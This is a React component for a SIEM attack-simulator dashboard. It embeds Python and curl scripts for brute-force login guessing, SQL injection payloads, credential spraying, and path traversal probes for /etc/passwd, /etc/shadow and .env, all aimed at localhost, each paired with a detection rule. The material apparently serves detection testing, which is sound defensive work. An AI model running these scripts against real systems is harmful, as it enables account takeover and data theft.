import { useState } from "react";
import axios from "axios";
import { Link } from "react-router-dom";
import { TerminalIcon, TrashIcon, CheckIcon, AlertIcon, LogIcon, CopyIcon } from "../components/Icons";

const ATTACK_CODE_SNIPPETS = {
  brute_force: {
    title: "Brute Force (Hydra) - Attack Code",
    description: "Rapid credential guessing loop targeting a single user within a 60-second sliding window.",
    python: `import requests, time

TARGET_URL = "http://localhost:5000/api/auth/login"
TARGET_USER = "admin@secureshare.local"
WORDLIST = [
    "123456", "password", "welcome1", "admin123", 
    "letmein", "toor", "pass123", "Admin123"
]

print(f"[*] Initiating Hydra Brute-Force Spray against {TARGET_USER}...")
for pwd in WORDLIST:
    payload = {"email": TARGET_USER, "password": pwd}
    headers = {"User-Agent": "python-requests/2.31.0 (Hydra-Attack-Tool)"}
    
    response = requests.post(TARGET_URL, json=payload, headers=headers)
    print(f"[-] Attempt '{pwd}' -> HTTP {response.status_code}")
    time.sleep(1.0) # > 5 attempts in < 60s triggers BRUTE_FORCE_ATTACK`,
    bash: `# Direct Bash loop simulation:
for pass in 123456 password welcome1 admin123 letmein toor pass123 Admin123; do
  curl -s -X POST http://localhost:5000/api/auth/login \\
    -H 'Content-Type: application/json' \\
    -d "{\\"email\\":\\"admin@secureshare.local\\",\\"password\\":\\"\${pass}\\"}"
  echo "[-] Tested password: \${pass}"
  sleep 1
done`,
    detectionRule: `Rule: BRUTE_FORCE_ATTACK
Sliding Window: 60 Seconds
Trigger Condition: count >= 5 failed logins from single IP
Action: Flag CRITICAL incident & generate automated iptables DROP rule.`,
  },
  sqli: {
    title: "SQL Injection Probe - Attack Code",
    description: "Injects URL-encoded SQL syntax and boolean bypass payloads into authentication and search routes.",
    python: `import requests

TARGET_URL = "http://localhost:5000/api/auth/login"
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "admin' --",
    "admin' /*",
    "' UNION SELECT null, username, password FROM users --",
    "1' AND 1=(SELECT COUNT(*) FROM tablenames); --"
]

print("[*] Launching SQL Injection vulnerability probing...")
for payload in SQLI_PAYLOADS:
    data = {"email": payload, "password": "password123"}
    headers = {"User-Agent": "sqlmap/1.7.2#stable (Automated SQL Scanner)"}
    
    res = requests.post(TARGET_URL, json=data, headers=headers)
    print(f"[!] Tested SQLi payload: {payload} -> HTTP {res.status_code}")`,
    bash: `# Direct Bash SQL Injection probe:
for payload in "' OR '1'='1" "admin' --" "admin' /*" "1' UNION SELECT null, username, password FROM users --"; do
  curl -s -X POST http://localhost:5000/api/auth/login \\
    -H 'Content-Type: application/json' \\
    -d "{\\"email\\":\\"\${payload}\\",\\"password\\":\\"dummy\\"}"
  echo "[-] Injected payload: \${payload}"
done`,
    detectionRule: `Rule: SQL_INJECTION
Signature Matching: Regex patterns for UNION SELECT, OR 1=1, boolean bypasses, and inline comments (-- or /*).
Trigger Condition: Matching SQL token in request payload or query parameter.
Action: Flag HIGH incident & advise parameterized queries / prepared statements.`,
  },
  credential_stuffing: {
    title: "Credential Stuffing / User Spray - Attack Code",
    description: "Sprays passwords across multiple distinct usernames from a single originating IP address.",
    python: `import requests, time

TARGET_URL = "http://localhost:5000/api/auth/login"
USER_SPRAY_LIST = [
    "root", "admin", "administrator", "ahmed", 
    "anuraj", "shahz", "anfas", "operator"
]
PASSWORD = "CompromisedPassword2026"

print("[*] Initiating Credential Stuffing & Username Enumeration...")
for user in USER_SPRAY_LIST:
    payload = {"email": f"{user}@secureshare.local", "password": PASSWORD}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Bot/1.0)"}
    
    res = requests.post(TARGET_URL, json=payload, headers=headers)
    print(f"[-] Spraying username '{user}' -> HTTP {res.status_code}")
    time.sleep(2.0) # > 3 distinct usernames in < 120s triggers CREDENTIAL_STUFFING`,
    bash: `# Multi-user curl spray loop:
for user in root admin administrator ahmed anuraj shahz anfas; do
  curl -s -X POST http://localhost:5000/api/auth/login \\
    -H 'Content-Type: application/json' \\
    -d "{\\"email\\":\\"\${user}@secureshare.local\\",\\"password\\":\\"SprayPass123\\"}"
  echo "[-] Sprayed account: \${user}"
  sleep 1
done`,
    detectionRule: `Rule: CREDENTIAL_STUFFING
Sliding Window: 120 Seconds
Trigger Condition: > 3 distinct target usernames failed from single IP.
Action: Flag HIGH incident & enforce CAPTCHA rate-limiting on /api/auth/login.`,
  },
  path_traversal: {
    title: "Directory Traversal & LFI - Attack Code",
    description: "Probes filesystem boundaries using relative path climbing tokens (../ and ..\\).",
    python: `import requests

BASE_URL = "http://localhost:8001/api/files/download"
TRAVERSAL_VECTORS = [
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fshadow",
    "..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
    "../../../../.env",
    "../../../../.git/config"
]

print("[*] Testing Directory Traversal and LFI file boundary escape...")
for path in TRAVERSAL_VECTORS:
    headers = {"User-Agent": "Nikto/2.1.6 (Security Scanner)"}
    res = requests.get(f"{BASE_URL}?path={path}", headers=headers)
    print(f"[!] Path Probe: {path} -> HTTP {res.status_code}")`,
    bash: `# Directory Traversal curl verification:
for path in "../../../../etc/passwd" "..%2f..%2f..%2fetc%2fshadow" "../../../../.env"; do
  curl -s -i "http://localhost:8001/api/files/download?path=\${path}"
  echo "[-] Probed path: \${path}"
done`,
    detectionRule: `Rule: PATH_TRAVERSAL
Pattern Matching: Regex for ../, ..\\, %2e%2e%2f, and sensitive UNIX/Windows paths (/etc/passwd, .env).
Trigger Condition: Detection of directory escape sequence in URI or parameter.
Action: Flag HIGH incident & enforce strict path normalization and chroot isolation.`,
  },
  all: {
    title: "Multi-Vector Campaign - Attack Code",
    description: "Concurrently launches multi-threaded attack streams across all threat vectors simultaneously.",
    python: `import requests, threading, time

def brute_force_worker():
    for pwd in ["123", "pass", "admin", "wrong", "fail", "test"]:
        requests.post("http://localhost:5000/api/auth/login", json={"email": "admin", "password": pwd})
        time.sleep(0.5)

def sqli_worker():
    for payload in ["' OR 1=1--", "UNION SELECT password FROM users"]:
        requests.post("http://localhost:5000/api/auth/login", json={"email": payload, "password": "123"})

def traversal_worker():
    for p in ["../../etc/passwd", "../.env"]:
        requests.get(f"http://localhost:8001/api/files/download?path={p}")

# Launch multi-vector attack threads concurrently
threads = [
    threading.Thread(target=brute_force_worker),
    threading.Thread(target=sqli_worker),
    threading.Thread(target=traversal_worker)
]

for t in threads: t.start()
for t in threads: t.join()
print("[+] Multi-vector attack campaign executed successfully.")`,
    bash: `# Multi-Vector simulation trigger via SIEM API:
curl -X POST http://localhost:5001/api/simulate \\
  -H 'Content-Type: application/json' \\
  -d '{"attack_type": "all"}'`,
    detectionRule: `SIEM Multi-Vector Aggregator:
Sliding Window: Real-time sliding window analysis across all event streams.
Result: Multi-vector isolation, per-IP threat clustering, and automated composite security score penalty.`,
  },
};

function AttackSimulator() {
  const [simulating, setSimulating] = useState(null);
  const [actionMessage, setActionMessage] = useState(null);
  const [history, setHistory] = useState([]);
  const [activeCodeModal, setActiveCodeModal] = useState(null); // 'brute_force' | 'sqli' | etc.
  const [codeTab, setCodeTab] = useState("python"); // 'python' | 'bash' | 'detection'
  const [copiedCode, setCopiedCode] = useState(false);

  const handleSimulate = async (attackType, label) => {
    try {
      setSimulating(attackType);
      setActionMessage(null);
      let res;
      try {
        res = await axios.post("/api/simulate", { attack_type: attackType });
      } catch {
        res = await axios.post("http://localhost:5001/api/simulate", { attack_type: attackType });
      }

      const msg = res.data.message || `Injected attack scenario for ${label}`;
      setActionMessage({ type: "success", text: msg });
      setHistory((prev) => [
        {
          id: Date.now(),
          type: label,
          attackType,
          timestamp: new Date().toLocaleTimeString(),
          response: msg,
          status: "SUCCESS",
        },
        ...prev.slice(0, 9),
      ]);
    } catch (err) {
      const errMsg = "Simulation error: " + (err.response?.data?.error || err.message);
      setActionMessage({ type: "error", text: errMsg });
      setHistory((prev) => [
        {
          id: Date.now(),
          type: label,
          attackType,
          timestamp: new Date().toLocaleTimeString(),
          response: errMsg,
          status: "FAILED",
        },
        ...prev.slice(0, 9),
      ]);
    } finally {
      setSimulating(null);
    }
  };

  const handleClearLogs = async () => {
    if (!window.confirm("Are you sure you want to clear access logs and reset the Threat Engine baseline?")) return;

    try {
      try {
        await axios.post("/api/clear-logs");
      } catch {
        await axios.post("http://localhost:5001/api/clear-logs");
      }
      setActionMessage({ type: "success", text: "Access logs cleared. Threat detection baseline reset." });
      setHistory([]);
    } catch (err) {
      setActionMessage({ type: "error", text: "Reset failed: " + err.message });
    }
  };

  const handleCopyCode = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(true);
    setTimeout(() => setCopiedCode(false), 2000);
  };

  const attackVectors = [
    {
      id: "brute_force",
      title: "Brute Force (Hydra)",
      description: "Generates rapid failed password attempts against target credentials within a 60-second window.",
      targetEndpoint: "/api/auth/login",
      targetUser: "admin@secureshare.local",
      rule: "Threshold: > 5 failed attempts in 60s",
      badgeColor: "badge-critical",
    },
    {
      id: "sqli",
      title: "SQL Injection Probe",
      description: "Injects URL-encoded SQL syntax (' OR 1=1--, UNION SELECT) into query parameters.",
      targetEndpoint: "/api/files/query?filter=' OR 1=1--",
      targetUser: "anonymous",
      rule: "Signature matching: SQL keywords & boolean bypasses",
      badgeColor: "badge-high",
    },
    {
      id: "credential_stuffing",
      title: "Credential Stuffing / Spray",
      description: "Iterates multiple distinct usernames from a single source IP address within 120 seconds.",
      targetEndpoint: "/api/auth/login",
      targetUser: "admin, root, analyst, operator",
      rule: "Threshold: > 3 distinct usernames in 120s",
      badgeColor: "badge-high",
    },
    {
      id: "path_traversal",
      title: "Directory Traversal & LFI",
      description: "Probes filesystem access using traversal payloads (../../etc/passwd, ..\\windows\\system32).",
      targetEndpoint: "/api/files/download/../../etc/passwd",
      targetUser: "anonymous",
      rule: "Pattern matching: Directory climbing signatures",
      badgeColor: "badge-medium",
    },
  ];

  const modalData = activeCodeModal ? ATTACK_CODE_SNIPPETS[activeCodeModal] : null;

  return (
    <div className="simulation-page">
      <div className="page-header">
        <div>
          <h1 className="page-title">Attack Simulator</h1>
          <p className="page-subtitle">
            Inject authentic attack forensic streams into <code>backend/logs/app_access.log</code> to test SIEM detection rules
          </p>
        </div>

        <div style={{ display: "flex", gap: "12px" }}>
          <Link to="/logs" className="btn-secondary" style={{ fontSize: "13px" }}>
            <LogIcon size={16} /> View Attack Logs
          </Link>
          <button className="btn-danger" onClick={handleClearLogs} disabled={simulating !== null}>
            <TrashIcon size={16} /> Reset Baseline
          </button>
        </div>
      </div>

      {actionMessage && (
        <div
          style={{
            padding: "16px 20px",
            background: actionMessage.type === "success" ? "var(--accent-amber-subtle)" : "var(--accent-rose-subtle)",
            border: `1px solid ${actionMessage.type === "success" ? "var(--accent-amber-border)" : "var(--accent-rose-border)"}`,
            borderRadius: "14px",
            color: actionMessage.type === "success" ? "var(--accent-amber)" : "var(--accent-rose)",
            marginBottom: "24px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            fontWeight: "600",
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            {actionMessage.type === "success" ? <CheckIcon size={18} /> : <AlertIcon size={18} />}
            <span>{actionMessage.text}</span>
          </div>
          <button
            style={{ background: "none", border: "none", color: "inherit", cursor: "pointer", fontSize: "16px" }}
            onClick={() => setActionMessage(null)}
          >
            ✕
          </button>
        </div>
      )}

      {/* Multi-Vector Campaign Hero Card */}
      <div
        className="card-section"
        style={{
          background: "linear-gradient(135deg, #faf5ff 0%, #ffffff 100%)",
          border: "1px solid rgba(126, 34, 206, 0.25)",
          marginBottom: "32px",
        }}
      >
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "16px" }}>
          <div style={{ maxWidth: "680px" }}>
            <span className="badge-tag badge-medium" style={{ marginBottom: "8px" }}>Full Campaign Test</span>
            <h2 style={{ fontSize: "20px", fontWeight: "800", color: "var(--text-primary)", marginBottom: "6px" }}>
              Multi-Vector Attack Campaign
            </h2>
            <p style={{ color: "var(--text-secondary)", fontSize: "14px", lineHeight: "1.5" }}>
              Executes all attack vectors simultaneously (Brute Force, SQL Injection, Credential Stuffing, and Directory Traversal).
              Validates sliding-window heuristic detection across multiple simulated offender IPs.
            </p>
          </div>

          <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
            <button
              className="btn-secondary"
              onClick={() => { setActiveCodeModal("all"); setCodeTab("python"); }}
            >
              &lt;/&gt; Code
            </button>
            <button
              className="btn-primary"
              style={{ padding: "14px 26px", fontSize: "14px" }}
              onClick={() => handleSimulate("all", "Multi-Vector Campaign")}
              disabled={simulating !== null}
            >
              <TerminalIcon size={18} />
              {simulating === "all" ? "Executing Campaign..." : "Launch Campaign Simulation"}
            </button>
          </div>
        </div>
      </div>

      {/* Attack Vectors Grid */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(320px, 1fr))", gap: "24px", marginBottom: "36px" }}>
        {attackVectors.map((vec) => (
          <div
            key={vec.id}
            className="card-section"
            style={{
              padding: "26px",
              display: "flex",
              flexDirection: "column",
              justifyContent: "space-between",
              marginBottom: 0,
            }}
          >
            <div>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px" }}>
                <span className={`badge-tag ${vec.badgeColor}`}>{vec.id.replace(/_/g, " ")}</span>
                <span style={{ fontSize: "11px", color: "var(--text-muted)", fontFamily: "monospace" }}>POST /api/simulate</span>
              </div>

              <h3 style={{ fontSize: "17px", fontWeight: "800", color: "var(--text-primary)", marginBottom: "8px" }}>
                {vec.title}
              </h3>

              <p style={{ fontSize: "13px", color: "var(--text-secondary)", lineHeight: "1.5", marginBottom: "16px" }}>
                {vec.description}
              </p>

              <div style={{ background: "var(--bg-surface)", padding: "14px", borderRadius: "12px", border: "1px solid var(--border-color)", fontSize: "12px", marginBottom: "20px" }}>
                <div style={{ marginBottom: "6px" }}>
                  <span style={{ color: "var(--text-muted)" }}>Target: </span>
                  <strong style={{ color: "var(--text-primary)", fontFamily: "monospace" }}>{vec.targetEndpoint}</strong>
                </div>
                <div style={{ marginBottom: "6px" }}>
                  <span style={{ color: "var(--text-muted)" }}>User: </span>
                  <strong style={{ color: "var(--text-primary)" }}>{vec.targetUser}</strong>
                </div>
                <div>
                  <span style={{ color: "var(--text-muted)" }}>Logic: </span>
                  <span style={{ color: "var(--accent-primary)", fontWeight: "600" }}>{vec.rule}</span>
                </div>
              </div>
            </div>

            <div style={{ display: "flex", gap: "8px" }}>
              <button
                className="btn-secondary"
                style={{ padding: "12px 14px", fontSize: "12px" }}
                onClick={() => { setActiveCodeModal(vec.id); setCodeTab("python"); }}
                title="View Exploit Code"
              >
                &lt;/&gt; Code
              </button>
              <button
                className="btn-primary"
                style={{ flex: 1, padding: "12px" }}
                onClick={() => handleSimulate(vec.id, vec.title)}
                disabled={simulating !== null}
              >
                <TerminalIcon size={16} />
                {simulating === vec.id ? "Injecting Traffic..." : `Simulate ${vec.title.split(" ")[0]}`}
              </button>
            </div>
          </div>
        ))}
      </div>

      {/* Real-Time Simulation Event Feed */}
      <div className="card-section">
        <div className="section-header">
          <div className="section-title">
            <span>Simulation History Journal</span>
          </div>
          <span style={{ fontSize: "12px", color: "var(--text-muted)" }}>Recent Runs: {history.length}</span>
        </div>

        {history.length === 0 ? (
          <div style={{ textAlign: "center", padding: "40px", color: "var(--text-secondary)" }}>
            No attack simulations executed yet in this session. Trigger any vector above to observe logs.
          </div>
        ) : (
          <div className="cyber-table-wrapper">
            <table className="cyber-table">
              <thead>
                <tr>
                  <th>Timestamp</th>
                  <th>Scenario</th>
                  <th>Status</th>
                  <th>Forensic Response</th>
                </tr>
              </thead>
              <tbody>
                {history.map((h) => (
                  <tr key={h.id}>
                    <td style={{ fontSize: "12px", color: "var(--text-muted)", whiteSpace: "nowrap" }}>{h.timestamp}</td>
                    <td style={{ fontWeight: "700", color: "var(--text-primary)" }}>{h.type}</td>
                    <td>
                      <span className={`badge-tag ${h.status === "SUCCESS" ? "badge-success" : "badge-critical"}`}>
                        {h.status}
                      </span>
                    </td>
                    <td style={{ fontSize: "13px", color: "var(--text-secondary)" }}>{h.response}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* Attack Code Viewer Modal */}
      {modalData && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: "rgba(15, 23, 42, 0.6)",
            backdropFilter: "blur(6px)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000,
            padding: "20px",
          }}
          onClick={() => setActiveCodeModal(null)}
        >
          <div
            style={{
              width: "100%",
              maxWidth: "760px",
              background: "#ffffff",
              borderRadius: "20px",
              border: "1px solid var(--border-color)",
              boxShadow: "var(--shadow-lg)",
              overflow: "hidden",
              display: "flex",
              flexDirection: "column",
              maxHeight: "90vh",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div
              style={{
                padding: "20px 24px",
                borderBottom: "1px solid var(--border-color)",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                background: "#f8fafc",
              }}
            >
              <div>
                <h3 style={{ fontSize: "18px", fontWeight: "800", color: "var(--text-primary)", marginBottom: "2px" }}>
                  {modalData.title}
                </h3>
                <p style={{ fontSize: "13px", color: "var(--text-secondary)" }}>
                  {modalData.description}
                </p>
              </div>

              <button
                style={{
                  background: "none",
                  border: "none",
                  fontSize: "20px",
                  color: "var(--text-muted)",
                  cursor: "pointer",
                  padding: "6px 10px",
                  borderRadius: "8px",
                }}
                onClick={() => setActiveCodeModal(null)}
              >
                ✕
              </button>
            </div>

            {/* Language & Info Tabs */}
            <div
              style={{
                padding: "12px 24px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                borderBottom: "1px solid var(--border-subtle)",
                background: "#ffffff",
                flexWrap: "wrap",
                gap: "10px",
              }}
            >
              <div style={{ display: "flex", gap: "8px" }}>
                <button
                  className={codeTab === "python" ? "btn-primary" : "btn-secondary"}
                  style={{ fontSize: "12px", padding: "6px 14px" }}
                  onClick={() => setCodeTab("python")}
                >
                  Python Exploit Script
                </button>

                <button
                  className={codeTab === "bash" ? "btn-primary" : "btn-secondary"}
                  style={{ fontSize: "12px", padding: "6px 14px" }}
                  onClick={() => setCodeTab("bash")}
                >
                  cURL / Bash Command
                </button>

                <button
                  className={codeTab === "detection" ? "btn-primary" : "btn-secondary"}
                  style={{ fontSize: "12px", padding: "6px 14px" }}
                  onClick={() => setCodeTab("detection")}
                >
                  Detection Heuristic
                </button>
              </div>

              <button
                className="btn-secondary"
                style={{ fontSize: "12px", padding: "6px 14px" }}
                onClick={() =>
                  handleCopyCode(
                    codeTab === "python"
                      ? modalData.python
                      : codeTab === "bash"
                      ? modalData.bash
                      : modalData.detectionRule
                  )
                }
              >
                {copiedCode ? (
                  <>
                    <CheckIcon size={14} /> Copied!
                  </>
                ) : (
                  <>
                    <CopyIcon size={14} /> Copy Code
                  </>
                )}
              </button>
            </div>

            {/* Code Body */}
            <div style={{ padding: "20px 24px", overflowY: "auto", background: "#0f172a" }}>
              <pre
                style={{
                  fontFamily: "'JetBrains Mono', monospace",
                  fontSize: "13px",
                  lineHeight: "1.6",
                  color: "#f8fafc",
                  margin: 0,
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                }}
              >
                {codeTab === "python" && modalData.python}
                {codeTab === "bash" && modalData.bash}
                {codeTab === "detection" && modalData.detectionRule}
              </pre>
            </div>

            {/* Modal Footer */}
            <div
              style={{
                padding: "16px 24px",
                borderTop: "1px solid var(--border-color)",
                background: "#f8fafc",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
              }}
            >
              <span style={{ fontSize: "12px", color: "var(--text-muted)" }}>
                Target Service: <code>backend/logs/app_access.log</code>
              </span>
              <button className="btn-primary" onClick={() => setActiveCodeModal(null)} style={{ padding: "8px 18px", fontSize: "13px" }}>
                Done
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default AttackSimulator;
